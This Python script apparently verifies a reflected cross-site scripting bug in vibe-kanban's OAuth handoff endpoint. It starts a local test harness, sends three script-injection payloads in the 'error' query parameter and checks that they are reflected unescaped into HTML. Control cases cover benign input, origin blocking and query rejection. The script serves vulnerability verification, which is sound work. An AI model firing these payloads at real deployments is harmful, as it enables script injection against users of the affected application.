#!/usr/bin/env python3
"""V1 reflected-XSS differential replay (vibe-kanban ledger #105/#110).

Starts the harness (real origin.rs via #[path] + verbatim oauth.rs spans,
same /api + ValidateRequestHeaderLayer wiring as routes/mod.rs), then issues
raw-socket GETs to /api/auth/handoff/complete.

The vuln run models a victim clicking an attacker link (top-level GET
navigation — browsers send NO Origin header on those, so validate_origin
passes per origin.rs:48-50). The error query param must come back UNESCAPED
in a text/html body (script-executable context).

The control run shows the same endpoint with a benign error value produces
no injected markup, that the handler logic is really reached (missing-code
branch), and that the origin gate still blocks requests that DO carry a
cross-site Origin header.
"""
import socket
import subprocess
import sys
import time
import urllib.parse

ROOT = "/home/azidan/AQL/AI/AITinkerers"
BIN = f"{ROOT}/scratch/verify/vibe-kanban-V1/target/debug/vk-xss-replay"
PORT = 41811
UUID0 = "00000000-0000-0000-0000-000000000000"


def raw_get(path, headers):
    lines = [f"GET {path} HTTP/1.1", f"Host: 127.0.0.1:{PORT}"]
    for name, value in headers.items():
        lines.append(f"{name}: {value}")
    lines.append("Connection: close")
    request = ("\r\n".join(lines) + "\r\n\r\n").encode()
    with socket.create_connection(("127.0.0.1", PORT), timeout=5) as s:
        s.sendall(request)
        chunks = []
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            chunks.append(chunk)
    raw = b"".join(chunks).decode("utf-8", "replace")
    head, _, body = raw.partition("\r\n\r\n")
    status = int(head.split(" ", 2)[1])
    ctype = ""
    for line in head.split("\r\n")[1:]:
        if line.lower().startswith("content-type:"):
            ctype = line.split(":", 1)[1].strip()
    return status, ctype, body


def q(params):
    return urllib.parse.urlencode(params)


def start_server():
    proc = subprocess.Popen(
        [BIN, str(PORT)],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    deadline = time.time() + 15
    while time.time() < deadline:
        line = proc.stdout.readline()
        if "READY" in line:
            return proc
        if proc.poll() is not None:
            sys.exit(f"harness exited early: {line}")
    proc.kill()
    sys.exit("harness never reported READY")


def run_vuln():
    ok = 0
    payloads = [
        ("P1_SVG_ONLOAD", "<svg onload=alert(document.domain)>"),
        ("P2_SCRIPT_TAG", "<script>alert(document.domain)</script>"),
        ("P3_IMG_ONERROR", "<img src=x onerror=alert(document.domain)>"),
    ]
    for name, payload in payloads:
        path = (f"/api/auth/handoff/complete?"
                + q({"handoff_id": UUID0, "error": payload}))
        # Attacker link click = top-level GET navigation: NO Origin header.
        status, ctype, body = raw_get(path, {})
        reflected = payload in body
        html = ctype.startswith("text/html")
        verdict = "REFLECTED" if (status == 400 and html and reflected) else "NO-EFFECT"
        print(f"SHAPE {name} status={status} ctype={ctype!r} "
              f"payload_reflected_unescaped={int(reflected)} verdict={verdict}")
        if verdict == "REFLECTED":
            ok += 1
    print(f"VULN_EFFECT=observed ({ok}/{len(payloads)} payloads reflected "
          f"unescaped into text/html on the app origin)")
    return 0 if ok == len(payloads) else 1


def run_control():
    ok = 0
    # K1: benign OAuth error value -> page renders, no injected markup.
    path = (f"/api/auth/handoff/complete?"
            + q({"handoff_id": UUID0, "error": "access_denied"}))
    status, ctype, body = raw_get(path, {})
    # The page's own markup contains a logo <img>; "clean" means no script
    # elements and no inline event-handler attributes (the XSS primitives).
    clean = ("<script" not in body and "onload=" not in body
             and "onerror=" not in body
             and "OAuth authorization failed: access_denied" in body)
    print(f"SHAPE K1_BENIGN_ERROR status={status} ctype={ctype!r} "
          f"benign_message_rendered={int('access_denied' in body)} "
          f"no_markup={int(clean)} verdict={'CLEAN' if status == 400 and clean else 'UNEXPECTED'}")
    ok += int(status == 400 and clean)

    # K2: valid handoff_id, no error, no app_code -> real missing-code branch.
    path = f"/api/auth/handoff/complete?{q({'handoff_id': UUID0})}"
    status, ctype, body = raw_get(path, {})
    branch = "Missing app_code in callback" in body
    print(f"SHAPE K2_NO_PARAMS status={status} missing_code_branch={int(branch)} "
          f"verdict={'HANDLER-REACHED' if status == 400 and branch else 'UNEXPECTED'}")
    ok += int(status == 400 and branch)

    # K3: same endpoint but WITH a cross-site Origin header -> gate blocks.
    path = (f"/api/auth/handoff/complete?"
            + q({"handoff_id": UUID0, "error": "<script>alert(1)</script>"}))
    status, ctype, body = raw_get(path, {"Origin": "http://evil.example"})
    blocked = status == 403 and "<script>" not in body
    print(f"SHAPE K3_CROSS_ORIGIN status={status} blocked_by_validate_origin={int(blocked)} "
          f"verdict={'BLOCKED' if blocked else 'UNEXPECTED'}")
    ok += int(blocked)

    # K4: no handoff_id at all -> axum Query rejection, NO reflection.
    # (Documents that ledger #105's original curl, which omitted handoff_id,
    #  could never have fired; a syntactically valid UUID is required.)
    path = f"/api/auth/handoff/complete?{q({'error': '<script>alert(1)</script>'})}"
    status, ctype, body = raw_get(path, {})
    rejected = status == 400 and "<script>alert(1)</script>" not in body
    print(f"SHAPE K4_MISSING_HANDOFF_ID status={status} query_rejected_no_reflection={int(rejected)} "
          f"verdict={'REJECTED-CLEAN' if rejected else 'UNEXPECTED'}")
    ok += int(rejected)

    total = 4
    print(f"CONTROL_EFFECT=clean ({ok}/{total} controls behaved benignly)")
    return 0 if ok == total else 1


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "vuln"
    proc = start_server()
    try:
        code = run_vuln() if mode == "vuln" else run_control()
    finally:
        proc.terminate()
        proc.wait(timeout=5)
    sys.exit(code)
